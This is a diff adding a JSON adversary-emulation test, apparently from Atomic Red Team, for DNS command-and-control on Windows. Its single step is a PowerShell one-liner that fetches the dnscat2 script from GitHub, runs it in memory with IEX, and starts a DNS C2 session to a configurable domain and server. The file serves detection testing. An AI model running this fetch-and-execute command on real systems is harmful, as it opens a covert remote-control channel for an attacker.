@@ -1,0 +1,37 @@
+{
+  "id": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7",
+  "name": "DNS C2",
+  "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "645ea047-e077-47a8-8251-a4fd215a2674",
+      "type": "execute-command",
+      "data": {
+        "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1071.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "Domain Name configured to use DNS Server where your C2 listener is running",
+      "value": "example.com"
+    },
+    {
+      "name": "server_ip",
+      "type": "string",
+      "description": "IP address of DNS server where your C2 listener is running",
+      "value": "127.0.0.1"
+    }
+  ]
+}
